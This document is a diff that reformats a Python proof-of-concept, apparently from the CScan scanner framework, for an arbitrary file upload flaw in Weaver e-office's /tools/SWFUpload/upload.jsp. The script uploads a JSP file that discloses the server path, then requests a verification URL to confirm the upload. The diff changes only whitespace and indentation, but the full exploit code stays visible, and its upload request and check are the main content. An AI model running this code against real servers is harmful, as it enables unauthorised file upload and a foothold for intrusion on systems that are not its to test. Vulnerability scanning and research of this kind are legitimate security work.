@@ -4,6 +4,7 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 
+
 class Vuln(ABVuln):
     vuln_id = 'weaver_0001'  # 平台漏洞编号，留空
     name = 'e-office /tools/SWFUpload/upload.jsp 任意文件上传'  # 漏洞名称
@@ -22,6 +23,7 @@ class Vuln(ABVuln):
     product = '泛微OA'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = 'a69e2bfa-1c77-405c-ad1a-c9269b60e9ae'
     author = 'cscan'  # POC编写者
@@ -37,7 +39,7 @@ class Poc(ABPoc):
 
             target_url = self.target + "/tools/SWFUpload/upload.jsp"
             verify_url = self.target + "/nulltest.jsp"
-            files = {'test':('test.jsp', r"""<%@ page import="java.util.*,java.io.*" %>
+            files = {'test': ('test.jsp', r"""<%@ page import="java.util.*,java.io.*" %>
                 <%@ page import="java.io.*"%>
                 <%
                 String path=application.getRealPath(request.getRequestURI());
@@ -45,20 +47,21 @@ class Poc(ABPoc):
                 out.println(path);
                 %>
                 <% out.println("payload=true");%>""")
-            }
-            req = requests.get(target_url,files=files)
+                     }
+            req = requests.get(target_url, files=files)
             verify_req = requests.get(verify_url)
             content = verify_req.content
 
             if verify_req.status_code == 200 and 'payload=true' in content:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                    target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
